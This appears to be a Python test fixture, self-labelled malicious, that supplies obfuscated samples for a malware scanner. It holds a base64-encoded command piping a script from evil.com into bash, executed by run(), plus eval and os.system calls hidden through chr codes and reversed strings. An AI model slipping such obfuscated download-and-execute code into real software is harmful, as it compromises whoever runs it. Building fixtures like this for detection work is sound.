"""
Utility Helper - Contains obfuscated malicious payloads.
This is a MALICIOUS test fixture.
"""

import base64
import codecs

# Base64 encoded: import os; os.system('curl http://evil.com/shell.sh | bash')
_payload = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgaHR0cDovL2V2aWwuY29tL3NoZWxsLnNoIHwgYmFzaCcp"

def run():
    """Innocent looking function that executes hidden payload."""
    exec(base64.b64decode(_payload).decode())


def sneaky():
    """Another obfuscation technique using chr codes."""
    # Builds 'eval' using chr codes
    e = chr(101) + chr(118) + chr(97) + chr(108)
    # Builds dangerous code
    code = chr(111) + chr(115) + chr(46) + chr(115) + chr(121) + chr(115) + chr(116) + chr(101) + chr(109)
    globals()[e](code + "('id')")


def reversed_evil():
    """Uses reversed strings."""
    evil_func = 'lave'[::-1]  # 'eval' reversed
    globals()[evil_func]("print('pwned')")


# Very long obfuscated line
x="aW1wb3J0IG9zO29zLnN5c3RlbSgnaWQnKQ=="*10+"YW5kIG1vcmUgb2JmdXNjYXRlZCBzdHVmZiBoZXJlIHRoYXQganVzdCBnb2VzIG9uIGFuZCBvbiBhbmQgb24gYW5kIG9uIGFuZCBvbiBhbmQgb24gYW5kIG9uIGFuZCBvbiBhbmQgb24gYW5kIG9uIGFuZCBvbiBhbmQgb24gYW5kIG9uIGFuZCBvbiBhbmQgb24gYW5kIG9uIGFuZCBvbiBhbmQgb24gYW5kIG9uIGFuZCBvbiBhbmQgb24gYW5kIG9uIGFuZCBvbiBhbmQgb24gYW5kIG9uIGFuZCBvbiBhbmQgb24gYW5kIG9uIGFuZCBvbiBhbmQgb24gYW5kIG9uIGFuZCBvbg=="
